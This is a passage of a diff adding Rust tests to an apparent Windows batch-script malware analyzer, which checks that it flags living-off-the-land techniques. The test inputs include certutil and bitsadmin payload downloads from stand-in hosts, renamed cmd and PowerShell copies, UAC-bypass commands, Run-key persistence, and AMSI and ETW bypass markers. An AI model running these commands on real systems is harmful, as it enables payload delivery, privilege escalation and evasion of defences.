+        pe[0x3c..0x40].copy_from_slice(&(0x80u32).to_le_bytes());
+        pe[0x80..0x84].copy_from_slice(b"PE\0\0");
+        pe.extend_from_slice(b"LoadLibraryA amsi.dll VirtualProtect\0");
+        pe.extend_from_slice(b"System.Diagnostics.Eventing.EventProvider\0");
+        let b64 = base64::engine::general_purpose::STANDARD.encode(&pe);
+        let script =
+            format!("echo {b64}>payload.b64\r\ncertutil -decode payload.b64 payload.dll\r\n");
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::DefenderEvasion { action, target }
+                    if action == "amsi-bypass" && target.eq_ignore_ascii_case("amsi.dll")
+            )),
+            "recovered artifact amsi.dll marker was not scanned: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::DefenderEvasion { action, .. } if action == "etw-patch"
+            )),
+            "recovered artifact EventProvider marker was not scanned: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn certutil_urlcache_emits_download_trait() {
         let mut env = Environment::new(&Config::default());
         interpret_line(
@@ -6626,6 +12393,26 @@ mod certutil_tests {
     }
 
     #[test]
+    fn certutil_urlcache_accepts_slash_option_prefix() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            "certutil /urlcache /split /f http://slash-cert.example/y.exe out.exe",
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::CertutilDownload { url, dst }
+                    if url == "http://slash-cert.example/y.exe" && dst == "out.exe"
+            )
+        });
+        assert!(
+            has,
+            "slash-prefixed certutil urlcache was not extracted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn certutil_urlcache_accepts_quoted_mixed_case_backslash_url() {
         let mut env = Environment::new(&Config::default());
         interpret_line(
@@ -6638,6 +12425,77 @@ mod certutil_tests {
             )
         });
         assert!(has, "no liberal CertutilDownload trait: {:?}", env.traits);
+    }
+
+    #[test]
+    fn certutil_urlcache_accepts_schemeless_domain_path() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            "certutil -urlcache -split -f cert-schemeless.example/payload.exe out.exe",
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::CertutilDownload { url, dst }
+                    if url == "http://cert-schemeless.example/payload.exe" && dst == "out.exe"
+            )
+        });
+        assert!(
+            has,
+            "no schemeless CertutilDownload trait: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn certutil_verifyctl_emits_download_trait() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            "certutil -verifyctl -f https://certutil-verifyctl.example/payload.cab out.cab",
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::CertutilDownload { url, dst }
+                    if url == "https://certutil-verifyctl.example/payload.cab" && dst == "out.cab"
+            )
+        });
+        assert!(
+            has,
+            "certutil -verifyctl download was not extracted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn certutil_urlcache_skips_slash_flag_after_url() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line("certutil -urlcache http://x/y.exe /f out.exe", &mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::CertutilDownload { url, dst } if url == "http://x/y.exe" && dst == "out.exe"
+            )
+        });
+        assert!(
+            has,
+            "certutil -urlcache slash flag was parsed as destination: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn certutil_encode_emits_lolbas_trait() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(r#"certutil -encode "%%~A" "%%~nA.enc""#, &mut env);
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::Lolbas { name, cmd }
+                    if name == "certutil" && cmd == r#"certutil -encode "%%~A" "%%~nA.enc""#
+            )),
+            "certutil -encode did not emit LOLBAS provenance: {:?}",
+            env.traits
+        );
     }
 
     #[test]
@@ -6671,18 +12529,53 @@ mod bitsadmin_tests {
 
     #[test]
     fn bitsadmin_transfer_emits_download() {
+        let raw =
+            "bitsadmin /transfer myjob /Download /Priority FOREGROUND http://x/y.exe C:\\temp\\y.exe";
         let mut env = Environment::new(&Config::default());
-        interpret_line(
-            "bitsadmin /transfer myjob /Download /Priority FOREGROUND http://x/y.exe C:\\temp\\y.exe",
-            &mut env,
-        );
+        interpret_line(raw, &mut env);
         let has = env.traits.iter().any(|t| {
             matches!(t,
                 Trait::BitsadminDownload { url, dst }
                     if url == "http://x/y.exe" && dst == "C:\\temp\\y.exe"
             )
         });
+        let has_lolbas = env
+            .traits
+            .iter()
+            .any(|t| matches!(t, Trait::Lolbas { name, cmd } if name == "bitsadmin" && cmd == raw));
         assert!(has, "no BitsadminDownload: {:?}", env.traits);
+        assert!(
+            has_lolbas,
+            "bitsadmin transfer not marked as LOLBAS: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn bitsadmin_transfer_emits_multiple_download_pairs() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"bitsadmin /transfer myjob /download /priority foreground "https://bits-direct.example/a.txt" "C:\Temp\a.exe" "https://bits-direct.example/b.txt" "C:\Temp\b.exe""#,
+            &mut env,
+        );
+        for (url, dst) in [
+            ("https://bits-direct.example/a.txt", "C:\\Temp\\a.exe"),
+            ("https://bits-direct.example/b.txt", "C:\\Temp\\b.exe"),
+        ] {
+            let has = env.traits.iter().any(|t| {
+                matches!(t,
+                    Trait::BitsadminDownload { url: got_url, dst: got_dst }
+                        if got_url == url && got_dst == dst
+                )
+            });
+            assert!(has, "missing BitsadminDownload for {url}: {:?}", env.traits);
+            assert!(
+                env.modified_filesystem
+                    .contains_key(&dst.to_ascii_lowercase()),
+                "missing filesystem download entry for {dst}: {:?}",
+                env.modified_filesystem
+            );
+        }
     }
 
     #[test]
@@ -6699,6 +12592,33 @@ mod bitsadmin_tests {
             )
         });
         assert!(has, "no schemeless BitsadminDownload: {:?}", env.traits);
+    }
+
+    #[test]
+    fn bitsadmin_addfile_emits_download() {
+        let raw = r#"bitsadmin /addfile "job1" "https://bits-addfile.example/payload.exe" "C:\Temp\payload.exe""#;
+        let mut env = Environment::new(&Config::default());
+        interpret_line(raw, &mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::BitsadminDownload { url, dst }
+                    if url == "https://bits-addfile.example/payload.exe"
+                        && dst == "C:\\Temp\\payload.exe"
+            )
+        });
+        let has_lolbas = env
+            .traits
+            .iter()
+            .any(|t| matches!(t, Trait::Lolbas { name, cmd } if name == "bitsadmin" && cmd == raw));
+        assert!(has, "no addfile BitsadminDownload: {:?}", env.traits);
+        assert!(
+            has_lolbas,
+            "bitsadmin addfile not marked as LOLBAS: {:?}",
+            env.traits
+        );
+        assert!(env
+            .modified_filesystem
+            .contains_key(r#"c:\temp\payload.exe"#));
     }
 }
 
@@ -6722,6 +12642,91 @@ mod wmic_tests {
         assert!(
             env.exec_cmd.iter().any(|c| c.contains("echo hi")),
             "no recursive cmd: {:?}",
+            env.exec_cmd
+        );
+    }
+
+    #[test]
+    fn wmic_node_process_call_create_extracts_inner() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"wmic /node:"target.example" process call create "cmd /c echo remote""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::WmicProcessCreate { inner_cmd } if inner_cmd == "cmd /c echo remote"
+            )
+        });
+        assert!(has, "no WmicProcessCreate with /node: {:?}", env.traits);
+        assert!(
+            env.exec_cmd.iter().any(|c| c == "cmd /c echo remote"),
+            "no recursive remote cmd: {:?}",
+            env.exec_cmd
+        );
+    }
+
+    #[test]
+    fn wmic_unquoted_process_call_create_extracts_inner() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(r#"wmic process call create cmd /c echo loose"#, &mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::WmicProcessCreate { inner_cmd } if inner_cmd == "cmd /c echo loose"
+            )
+        });
+        assert!(has, "no unquoted WmicProcessCreate: {:?}", env.traits);
+        assert!(
+            env.exec_cmd.iter().any(|c| c == "cmd /c echo loose"),
+            "no recursive unquoted cmd: {:?}",
+            env.exec_cmd
+        );
+    }
+
+    #[test]
+    fn wmic_process_call_create_tolerates_spacing_and_case() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            "WMIC   /NODE:target.example   PROCESS   CALL   CREATE   \"cmd /c echo spaced\"",
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::WmicProcessCreate { inner_cmd } if inner_cmd == "cmd /c echo spaced"
+            )
+        });
+        assert!(
+            has,
+            "spacing/case variant did not emit WmicProcessCreate: {:?}",
+            env.traits
+        );
+        assert!(
+            env.exec_cmd.iter().any(|c| c == "cmd /c echo spaced"),
+            "spacing/case variant did not recurse: {:?}",
+            env.exec_cmd
+        );
+    }
+
+    #[test]
+    fn wmic_process_call_create_ignores_current_directory_argument() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"wmic process call create "cmd /c echo payload", "C:\Users\Public""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::WmicProcessCreate { inner_cmd } if inner_cmd == "cmd /c echo payload"
+            )
+        });
+        assert!(
+            has,
+            "current-directory argument was not stripped from WMIC child: {:?}",
+            env.traits
+        );
+        assert!(
+            env.exec_cmd.iter().any(|c| c == "cmd /c echo payload"),
+            "current-directory argument leaked into recursive cmd: {:?}",
             env.exec_cmd
         );
     }
@@ -6758,6 +12763,25 @@ mod cscript_tests {
     }
 
     #[test]
+    fn cscript_basename_vbs_content_extracts_full_path_payload() {
+        let mut env = Environment::new(&Config::default());
+        let vbs_content = b"WScript.Echo \"full path\"\r\n".to_vec();
+        env.modified_filesystem.insert(
+            r#"c:\temp\dropper.vbs"#.to_string(),
+            FsEntry::Content {
+                content: vbs_content.clone(),
+                append: false,
+            },
+        );
+        interpret_line("cscript //nologo dropper.vbs", &mut env);
+        assert!(
+            env.exec_vbs.iter().any(|c| c == &vbs_content),
+            "basename VBS content was not extracted from full-path tracked file: {:?}",
+            env.exec_vbs
+        );
+    }
+
+    #[test]
     fn wscript_with_js_content_extracts_payload() {
         let mut env = Environment::new(&Config::default());
         let js_content = b"WScript.Echo('hi')\r\n".to_vec();
@@ -6774,6 +12798,231 @@ mod cscript_tests {
             "js not extracted"
         );
     }
+
+    #[test]
+    fn cscript_repeated_vbs_content_is_queued_once() {
+        let mut env = Environment::new(&Config::default());
+        let vbs_content = b"WScript.Echo \"dedupe\"\r\n".to_vec();
+        env.modified_filesystem.insert(
+            "dropper.vbs".to_string(),
+            FsEntry::Content {
+                content: vbs_content.clone(),
+                append: false,
+            },
+        );
+
+        interpret_line("cscript //nologo dropper.vbs", &mut env);
+        interpret_line("cscript //nologo dropper.vbs", &mut env);
+
+        assert_eq!(
+            env.all_extracted_vbs
+                .iter()
+                .filter(|content| *content == &vbs_content)
+                .count(),
+            1,
+            "duplicate VBS payload queued: {:?}",
+            env.all_extracted_vbs
+        );
+    }
+
+    #[test]
+    fn wscript_repeated_js_content_is_queued_once() {
+        let mut env = Environment::new(&Config::default());
+        let js_content = b"WScript.Echo('dedupe')\r\n".to_vec();
+        env.modified_filesystem.insert(
+            "drop.js".to_string(),
+            FsEntry::Content {
+                content: js_content.clone(),
+                append: false,
+            },
+        );
+
+        interpret_line("wscript drop.js", &mut env);
+        interpret_line("wscript drop.js", &mut env);
+
+        assert_eq!(
+            env.all_extracted_jscript
+                .iter()
+                .filter(|content| *content == &js_content)
+                .count(),
+            1,
+            "duplicate JScript payload queued: {:?}",
+            env.all_extracted_jscript
+        );
+    }
+
+    #[test]
+    fn script_hosts_emit_url_argument_for_remote_script_url() {
+        let cscript_raw = r#"cscript //nologo "https://script-host.example/dropper.vbs""#;
+        let wscript_raw = r#"wscript "script-host-schemeless.example/dropper.js""#;
+        let mut env = Environment::new(&Config::default());
+        interpret_line(cscript_raw, &mut env);
+        interpret_line(wscript_raw, &mut env);
+
+        for expected in [
+            "https://script-host.example/dropper.vbs",
+            "http://script-host-schemeless.example/dropper.js",
+        ] {
+            assert!(
+                env.traits
+                    .iter()
+                    .any(|t| matches!(t, Trait::UrlArgument { url, .. } if url == expected)),
+                "missing script-host UrlArgument for {expected}: {:?}",
+                env.traits
+            );
+        }
+        for (name, cmd) in [("cscript", cscript_raw), ("wscript", wscript_raw)] {
+            assert!(
+                env.traits
+                    .iter()
+                    .any(|t| matches!(t, Trait::Lolbas { name: got_name, cmd: got_cmd } if got_name == name && got_cmd == cmd)),
+                "missing script-host LOLBAS provenance for {name}: {:?}",
+                env.traits
+            );
+        }
+    }
+
+    #[test]
+    fn script_hosts_resolve_prior_download_source_url() {
+        let script = br#"
+curl -o dropper.vbs https://script-host-source.example/dropper.vbs
+cscript //nologo dropper.vbs
+wget -O loader.js https://script-host-source.example/loader.js
+wscript loader.js
+"#;
+        let report = crate::analyze(script, &Config::default());
+        for expected in [
+            "https://script-host-source.example/dropper.vbs",
+            "https://script-host-source.example/loader.js",
+        ] {
+            assert!(
+                report
+                    .traits
+                    .iter()
+                    .any(|t| matches!(t, Trait::UrlArgument { url, .. } if url == expected)),
+                "missing script-host source UrlArgument for {expected}: {:?}",
+                report.traits
+            );
+        }
+        for (name, cmd) in [
+            ("cscript", "cscript //nologo dropper.vbs"),
+            ("wscript", "wscript loader.js"),
+        ] {
+            assert!(
+                report
+                    .traits
+                    .iter()
+                    .any(|t| matches!(t, Trait::Lolbas { name: got_name, cmd: got_cmd } if got_name == name && got_cmd == cmd)),
+                "missing script-host source LOLBAS provenance for {name}: {:?}",
+                report.traits
+            );
+        }
+    }
+
+    #[test]
+    fn cscript_basename_resolves_full_path_download_source_url() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"curl -o C:\Temp\dropper.vbs https://script-host-basename.example/dropper.vbs"#,
+            &mut env,
+        );
+        interpret_line("cscript //nologo dropper.vbs", &mut env);
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == "cscript //nologo dropper.vbs"
+                            && url == "https://script-host-basename.example/dropper.vbs"
+                )
+            }),
+            "cscript basename did not resolve full-path download source: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn script_host_invocation_in_deob_text_emits_exec_trait() {
+        let mut env = Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"for /f "delims=" %%I in ('cscript /nologo "%~f0?.wsf" script.bat "%~2"') do set "%~1=%%I""#,
+            &mut env,
+        );
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::CscriptExec { src } if src == "%~f0?.wsf"
+            )),
+            "deob-text cscript invocation did not emit CscriptExec: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn conditional_wscript_invocation_in_deob_text_emits_exec_trait() {
+        let mut env = Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"if exist CPU.bat (wscript.exe invisible.vbs CPU.bat)"#,
+            &mut env,
+        );
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::WscriptExec { src } if src == "invisible.vbs"
+            )),
+            "deob-text wscript invocation did not emit WscriptExec: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn script_host_prose_in_deob_text_does_not_emit_exec_trait() {
+        let mut env = Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"' Checks if this script is running under cscript.exe
+if InStrRev(LCase(WScript.FullName), "cscript.exe", -1) <> 0 then"#,
+            &mut env,
+        );
+        assert!(
+            !env.traits
+                .iter()
+                .any(|t| { matches!(t, Trait::CscriptExec { .. } | Trait::WscriptExec { .. }) }),
+            "prose/comment cscript mention emitted script-host trait: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn script_host_registry_value_in_deob_text_does_not_emit_exec_trait() {
+        let mut env = Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Teams" /t REG_SZ /d "wscript.exe //B //Nologo \"C:\Users\Public\Hate.vbs\"" /f"#,
+            &mut env,
+        );
+        assert!(
+            !env.traits
+                .iter()
+                .any(|t| { matches!(t, Trait::CscriptExec { .. } | Trait::WscriptExec { .. }) }),
+            "registry value wscript command emitted immediate script-host trait: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn script_host_non_script_source_in_deob_text_does_not_emit_exec_trait() {
+        let mut env = Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"wscript.exe C:\Users\Public\renamed-copy.exe"#,
+            &mut env,
+        );
+        assert!(
+            !env.traits
+                .iter()
+                .any(|t| { matches!(t, Trait::CscriptExec { .. } | Trait::WscriptExec { .. }) }),
+            "non-script wscript source emitted script-host trait: {:?}",
+            env.traits
+        );
+    }
 }
 
 #[cfg(test)]
@@ -6785,11 +13034,9 @@ mod extrac32_tests {
 
     #[test]
     fn extrac32_self_reference_records_trait() {
+        let raw = r#"extrac32 /y "C:\Users\al\Downloads\script.bat" "%temp%\dropped.exe""#;
         let mut env = Environment::new(&Config::default());
-        interpret_line(
-            r#"extrac32 /y "C:\Users\al\Downloads\script.bat" "%temp%\dropped.exe""#,
-            &mut env,
-        );
+        interpret_line(raw, &mut env);
         let has = env.traits.iter().any(|t| {
             matches!(
                 t,
@@ -6800,6 +13047,344 @@ mod extrac32_tests {
             )
         });
         assert!(has, "no Extrac32 self_reference: {:?}", env.traits);
+        assert!(
+            env.traits.iter().any(
+                |t| matches!(t, Trait::Lolbas { name, cmd } if name == "extrac32" && cmd == raw)
+            ),
+            "extrac32 extraction not marked as LOLBAS: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn extrac32_copy_windows_util_emits_manipulation_trait() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"extrac32 /c /y "C:\Windows\System32\cmd.exe" "C:\Users\Public\alpha.pif""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::WindowsUtilManip { src, dst, .. }
+                    if src == r#"C:\Windows\System32\cmd.exe"#
+                        && dst == r#"C:\Users\Public\alpha.pif"#
+            )
+        });
+        assert!(
+            has,
+            "extrac32 copied Windows utility was not surfaced: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn extrac32_doubled_backslash_windows_util_emits_manipulation_trait() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"extrac32 /c /y "C:\\Windows\\System32\\cmd.exe" "C:\\Users\\Public\\alpha.pif""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::WindowsUtilManip { src, dst, .. }
+                    if src == r#"C:\Windows\System32\cmd.exe"#
+                        && dst == r#"C:\Users\Public\alpha.pif"#
+            )
+        });
+        assert!(
+            has,
+            "extrac32 copied Windows utility with doubled slashes was not surfaced: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn copied_extrac32_alias_replays_copy_arguments() {
+        let report = crate::analyze(
+            br#"extrac32 /c /y "C:\Windows\System32\extrac32.exe" "C:\Users\Public\expha.pif"
+C:\Users\Public\expha.pif /c /y "C:\Windows\System32\cmd.exe" "C:\Users\Public\alpha.pif"
+"#,
+            &Config::default(),
+        );
+        let has = report.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::WindowsUtilManip { src, dst, .. }
+                    if src == r#"C:\Windows\System32\cmd.exe"#
+                        && dst == r#"C:\Users\Public\alpha.pif"#
+            )
+        });
+        assert!(
+            has,
+            "copied extrac32 alias did not replay copy arguments: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn copied_certutil_alias_nested_after_cmd_c_emits_decode_trait() {
+        let report = crate::analyze(
+            br#"extrac32 /c /y "C:\Windows\System32\extrac32.exe" "C:\Users\Public\expha.pif"
+C:\Users\Public\expha.pif /c /y "C:\Windows\System32\certutil.exe" "C:\Users\Public\ghf.pif"
+C:\Users\Public\alpha.pif /C C:\Users\Public\ghf.pif -decodehex -f "%~f0" "C:\Users\Public\HEW.3GP" 9
+"#,
+            &Config::default(),
+        );
+        let has = report.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::CertutilDecode { src, dst, .. }
+                    if src == "%~f0" && dst == r#"C:\Users\Public\HEW.3GP"#
+            )
+        });
+        assert!(
+            has,
+            "copied certutil alias did not replay nested decode command: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn copied_rundll32_alias_emits_rundll32_trait() {
+        let report = crate::analyze(
+            br#"extrac32 /c /y "C:\Windows\System32\extrac32.exe" "C:\Users\Public\expha.pif"
+C:\Users\Public\expha.pif /c /y "C:\Windows\System32\rundll32.exe" "C:\Users\Public\rdha.pif"
+C:\Users\Public\rdha.pif zipfldr.dll,RouteTheCall C:\Users\Public\ANYDESK.PIF
+"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::ManipulatedExec { target, .. }
+                        if target == r#"C:\Users\Public\rdha.pif"#
+                )
+            }),
+            "copied rundll32 alias did not emit manipulated execution: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Rundll32 { cmd, .. }
+                        if cmd == r#"rundll32.exe zipfldr.dll,RouteTheCall C:\Users\Public\ANYDESK.PIF"#
+                )
+            }),
+            "copied rundll32 alias did not replay through rundll32 handler: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn copied_cmd_alias_emits_manipulated_exec_for_c_switch() {
+        let report = crate::analyze(
+            br#"extrac32 /c /y "C:\Windows\System32\extrac32.exe" "C:\Users\Public\expha.pif"
+C:\Users\Public\expha.pif /c /y "C:\Windows\System32\cmd.exe" "C:\Users\Public\alpha.pif"
+C:\Users\Public\alpha.pif /C ping -n 2 127.0.0.1
+"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::ManipulatedExec { target, .. }
+                        if target == r#"C:\Users\Public\alpha.pif"#
+                )
+            }),
+            "copied cmd alias did not emit manipulated execution: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn extrac32_l_option_value_is_not_treated_as_source() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"extrac32 /Y /L "C:\Users\Public" "C:\Users\al\Downloads\payload.cab""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::Extrac32 { src, dst, .. }
+                    if src == r#"C:\Users\al\Downloads\payload.cab"# && dst == r#"C:\Users\Public"#
+            )
+        });
+        assert!(
+            has,
+            "extrac32 /L value was parsed as positional source: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn extrac32_preserves_download_source_for_later_execution() {
+        let report = crate::analyze(
+            br#"curl -o payload.cab https://extrac32-download.example/payload.cab
+extrac32 /y payload.cab dropped.hta
+mshta dropped.hta"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == "mshta dropped.hta"
+                            && url == "https://extrac32-download.example/payload.cab"
+                )
+            }),
+            "extrac32 extracted artifact was not linked on later execution: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn extrac32_basename_archive_preserves_download_source_for_later_execution() {
+        let report = crate::analyze(
+            br#"curl -o C:\Temp\payload.cab https://extrac32-basename.example/payload.cab
+extrac32 /y payload.cab dropped.hta
+mshta dropped.hta"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == "mshta dropped.hta"
+                            && url == "https://extrac32-basename.example/payload.cab"
+                )
+            }),
+            "extrac32 basename archive extraction was not linked on later execution: {:?}",
+            report.traits
+        );
+    }
+}
+
+#[cfg(test)]
+#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
+mod esentutl_tests {
+    use crate::analyze;
+    use crate::env::{Config, Environment};
+    use crate::interp::interpret_line;
+    use crate::traits::Trait;
+
+    #[test]
+    fn esentutl_copy_windows_util_emits_manipulation_trait() {
+        let script = br#"esentutl /y C:\Windows\System32\cmd.exe /d C:\Users\Public\alpha.pif /o"#;
+        let report = analyze(script, &Config::default());
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::WindowsUtilManip { src, dst, .. }
+                        if src == r#"C:\Windows\System32\cmd.exe"#
+                            && dst == r#"C:\Users\Public\alpha.pif"#
+                )
+            }),
+            "esentutl copied Windows utility was not surfaced: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn esentutl_copied_powershell_alias_is_scanned_as_manipulated_exec() {
+        let script = br#"esentutl /y C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe /d C:\Users\Public\psh.pif /o
+C:\Users\Public\psh.pif -NoProfile -Command "iwr https://esentutl-alias.example/stage.ps1"
+"#;
+        let report = analyze(script, &Config::default());
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::ManipulatedExec { target, .. }
+                        if target == r#"C:\Users\Public\psh.pif"#
+                )
+            }),
+            "esentutl-copied PowerShell alias was not surfaced as manipulated exec: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "https://esentutl-alias.example/stage.ps1"
+                )
+            }),
+            "esentutl-copied PowerShell alias command was not scanned: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn cmstp_au_direct_command_emits_uac_bypass_trait() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(r#"cmstp.exe /s /au C:\Users\Public\stage.inf"#, &mut env);
+        assert!(
+            env.traits
+                .iter()
+                .any(|t| matches!(t, Trait::UacBypass { technique } if technique == "cmstp-au")),
+            "cmstp /au direct command was not surfaced: {:?}",
+            env.traits
+        );
+        assert!(
+            env.traits
+                .iter()
+                .any(|t| matches!(t, Trait::Lolbas { name, .. } if name == "cmstp")),
+            "cmstp /au direct command was not marked as LOLBAS: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn msconfig_4_direct_command_emits_uac_bypass_trait() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line("msconfig /4", &mut env);
+        assert!(
+            env.traits
+                .iter()
+                .any(|t| matches!(t, Trait::UacBypass { technique } if technique == "msconfig-4")),
+            "msconfig /4 direct command was not surfaced: {:?}",
+            env.traits
+        );
+        assert!(
+            env.traits
+                .iter()
+                .any(|t| matches!(t, Trait::Lolbas { name, .. } if name == "msconfig")),
+            "msconfig /4 direct command was not marked as LOLBAS: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn auto_elevate_direct_commands_emit_uac_bypass_trait() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line("fodhelper.exe", &mut env);
+        interpret_line(r#"C:\Windows\System32\eventvwr.exe"#, &mut env);
+        interpret_line(r#"C:\Windows\System32\ComputerDefaults.ExE"#, &mut env);
+        for expected in ["fodhelper", "eventvwr", "computerdefaults"] {
+            assert!(
+                env.traits
+                    .iter()
+                    .any(|t| matches!(t, Trait::UacBypass { technique } if technique == expected)),
+                "auto-elevate command {expected} was not surfaced: {:?}",
+                env.traits
+            );
+            assert!(
+                env.traits
+                    .iter()
+                    .any(|t| matches!(t, Trait::Lolbas { name, .. } if name == expected)),
+                "auto-elevate command {expected} was not marked as LOLBAS: {:?}",
+                env.traits
+            );
+        }
     }
 }
 
@@ -6976,6 +13561,17 @@ mod inline_if_tests {
             report.deobfuscated
         );
     }
+
+    #[test]
+    fn inline_if_false_runs_parenthesized_else_body() {
+        let script = b"if \"off.\" EQU \"on.\" (set X=bad) else (set X=good)\r\necho %X%\r\n";
+        let report = analyze(script, &Config::default());
+        assert!(
+            report.deobfuscated.contains("echo good"),
+            "else branch did not run, got:\n{}",
+            report.deobfuscated
+        );
+    }
 }
 
 #[cfg(test)]
@@ -7066,6 +13662,36 @@ mod trait_dedup_tests {
     }
 
     #[test]
+    fn capped_trait_summaries_are_emitted_in_stable_kind_order() {
+        let mut traits = Vec::new();
+        for i in 0..3 {
+            traits.push(Trait::RegQuery {
+                key: format!("HKCU\\Software\\Test\\{i}"),
+                value: None,
+            });
+            traits.push(Trait::Arithmetic {
+                expr: format!("{i}+1"),
+                value: i + 1,
+            });
+            traits.push(Trait::DirListing {
+                path: format!("C:\\Temp\\{i}"),
+                flags: Vec::new(),
+            });
+        }
+
+        super::dedup_traits(&mut traits, 1);
+        let capped_kinds: Vec<_> = traits
+            .iter()
+            .filter_map(|t| match t {
+                Trait::TraitsCapped { capped_kind, .. } => Some(capped_kind.as_str()),
+                _ => None,
+            })
+            .collect();
+
+        assert_eq!(capped_kinds, ["Arithmetic", "DirListing", "RegQuery"]);
+    }
+
+    #[test]
     fn repeated_download_iocs_are_deduped_even_when_command_context_differs() {
         let script = b"powershell -Command \"curl http://82.65.68.158/yl1.ps1\"\r\npowershell -Command \"iwr http://82.65.68.158/yl1.ps1\"\r\npowershell -Command \"(New-Object Net.WebClient).DownloadString('http://82.65.68.158/yl1.ps1')\"\r\n";
         let cfg = Config {
@@ -7090,6 +13716,63 @@ mod trait_dedup_tests {
         assert!(
             !capped,
             "duplicate downloads caused cap: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn generic_download_is_removed_when_structured_download_exists() {
+        let url = "https://dedupe-child-vbs.example/payload.vbs";
+        let script = format!(
